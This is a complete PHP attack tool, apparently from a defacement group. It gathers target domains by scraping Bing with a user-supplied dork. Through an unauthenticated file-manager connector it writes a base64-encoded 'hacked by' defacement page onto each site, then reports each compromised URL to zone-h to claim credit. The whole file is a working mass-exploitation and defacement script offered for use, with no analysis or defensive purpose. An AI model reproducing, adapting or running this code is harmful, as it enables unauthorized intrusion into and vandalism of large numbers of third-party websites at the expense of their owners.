<?php
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
print "
Bot Auto Tusbol Hosting Nazuka
Coded : zafk1el - Indoxploit - linuxsec.org
Gr33tz : Mr.MaGnoM , All IndoXploit member
";
$zh = "zafk1el"; // zone-h nick
/*---------------------------*/
function getsource($url,$post=null) {
		$ch = curl_init($url);
		if($post != null) {
	 	 	curl_setopt($ch, CURLOPT_POST, true);
		  	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
		  	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		return curl_exec($ch);
		  	curl_close($ch);
	}
function ngirim($url, $isi){
$ch = curl_init ("$url");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);
return $data3;
}
echo "\n dork : ";$dork=trim(fgets(STDIN,1024));
$do=urlencode($dork);
        //$ip="200.58.111.34";
        $npage = 1;
        $npages = 30000;
        $allLinks = array();
        $lll = array();
        while($npage <= $npages) {
            $x = getsource("http://www.bing.com/search?q=".$do."&first=" . $npage."&FORM=PERE4");
            if ($x) {
                preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
                $npage = $npage + 10;
                if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
            } else break;
        }
        $URLs = array();
        foreach($allLinks as $url){
            $exp = explode("/", $url);
            $URLs[] = $exp[2];
        }
        $array = array_filter($URLs);
        $array = array_unique($array);
        $sss=count(array_unique($array));
                echo"\nReady to fuck ". $sss." site";
 
        foreach ($array as $domain) {
		$_SESSION[$domain] = "1";	
		// set var all site + path to x
		$domain1 = "http://$domain"; // URL TARGET
		$domain_exploit = $domain1."/_file-manager/php/connector.php"; // URL to Exploit
$target = $domain_exploit;
$pwnz= "$domain1/zaf.php";
$nama_doang = "zaf.php";
$isi_nama_doang = "DQoNCg0KDQoNCjxodG1sPjxoZWFkPiANCjx0aXRsZT5IYWNrZWQgYnkgWmFmazFlbDwvdGl0bGU+IA0KPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJpbmRleCwgZm9sbG93Ij4gDQo8bGluayByZWw9IlNIT1JUQ1VUIElDT04iICAgaHJlZj0iaHR0cDovL2kuaW1ndXIuY29tL1FZVUZtNXUucG5nIi8+IA0KPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkhhY2tlZCBieSBaZiIgLz4gIA0KPG1ldGEgY29udGVudD0nemFma2llbCwga3VydW1pLCBsaW51eHNlYycgbmFtZT0na2V5d29yZHMnLz4NCjxtZXRhIG5hbWU9Imdvb2dsZWJvdCIgY29udGVudD0iaW5kZXgsZm9sbG93IiAvPiANCiA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImFsbCIgLz4gDQogIDxtZXRhIG5hbWU9InJvYm90cyBzY2hlZHVsZSIgY29udGVudD0iYXV0byIgLz4gDQogIDxtZXRhIG5hbWU9ImRpc3RyaWJ1dGlvbiIgY29udGVudD0iZ2xvYmFsIiAvPiANCiAgPGJhc2UgdGFyZ2V0PSdfYmxhbmsnLz4gDQo8L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJibGFjayIgPiANCjx0YWJsZSB3aWR0aD0xMDAlIGhlaWdodD0xMDAlPg0KPHRkIGFsaWduPWNlbnRlcj4NCjxjZW50ZXI+DQo8Zm9udCBzaXplPSI1IiBjb2xvcj0iI2ZmZmZmZiIgZmFjZT0iQ2FsaWJyaSI+PGI+emFmazFlbCBwd25lZCB5b3UgLSBsaW51eHNlYy5vcmc8L2I+PC9mb250Pjxicj4NCjxhdWRpbyBhdXRvcGxheT4NCiAgICAgIDxzb3VyY2Ugc3JjPScvL2dpdC5saW51eHNlYy5vcmcvYmxvZy9tdXNpYy9Qb3J0ZXJfUm9iaW5zb25fX1NoZWx0ZXJfKFJpbl9EaWFsb2dfVmVyc2lvbikubXAzJz4NCjwvYXVkaW8+DQoNCjwvdGQ+IA0KPC9ib2R5PjwvaHRtbD4NCg0K";
$decode_isi = base64_decode($isi_nama_doang);
$encode = base64_encode($nama_doang);
 
$fp = fopen($nama_doang,"w");
fputs($fp, $decode_isi);
echo "\n# $domain1\n# Try exploit...\n";
$url_mkfile = "$target?cmd=mkfile&name=$nama_doang&target=l1_Lw";
$b = file_get_contents("$url_mkfile");
 
 $post1 = array(
                    "cmd" => "put",
                    "target" => "l1_$encode",
                    "content" => "$decode_isi",
                   
                    );
 $post2 = array(
                   
                    "current" => "8ea8853cb93f2f9781e0bf6e857015ea",
                    "upload[]" => "@$nama_doang",
                   
                    );
 
$output_mkfile = ngirim("$target", $post1);
if(preg_match("/$nama_doang/", $output_mkfile)){
    echo "Exploit success => $nama_doang\nUrl : $pwnz\n";
echo "[+] zone-h: ";
                        $ch3 = curl_init ("http://www.zone-h.com/notify/single");
                        curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt ($ch3, CURLOPT_POST, 1);
                        curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=$zh&domain1=$pwnz&hackmode=1&reason=1");
                       
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " OK - Notified by Zafk1el \n";}
else{
                echo " No \n";
}

}
else{
    echo "Exploit failed\n\n";
}
}
?>
